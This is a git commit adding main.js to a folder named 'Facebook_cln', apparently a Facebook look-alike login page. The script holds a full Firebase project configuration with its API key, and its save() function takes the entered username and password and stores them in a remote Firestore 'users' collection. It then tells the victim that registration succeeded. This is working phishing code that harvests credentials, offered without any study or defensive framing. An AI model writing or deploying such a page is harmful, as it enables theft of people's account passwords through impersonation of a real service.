65d7d4e0e241fb3a1e288cc1af31008ef03a383a
andresfe08 <96803035+andresfe08@users.noreply.github.com>
2023-01-04 15:59:17 -0500

    Aceptar

---
+++ Facebook_cln/main.js
@@ -0,0 +1,25 @@
+firebase.initializeApp({
+  apiKey: "AIzaSyCUEcMi0tMUyBICjn79Wen1zksNv6X3MGg",
+  authDomain: "datosyusuarios3.firebaseapp.com",
+  databaseURL: "https://datosyusuarios3-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "datosyusuarios3",
+  storageBucket: "datosyusuarios3.appspot.com",
+  messagingSenderId: "1018178001283",
+  appId: "1:1018178001283:web:c7d505275822ee2fd63eb6"
+});
+
+var db = firebase.firestore();
+
+
+function save(){
+  db.collection("users").add({
+    Campo1: document.getElementById("user").value,
+    Campo2: document.getElementById("passw").value,
+  })
+  .then((docRef) => {
+      alert('Registro exitoso');
+  })
+  .catch((error) => {
+      alert('Se ha producido un error al registrar');
+  });
+}
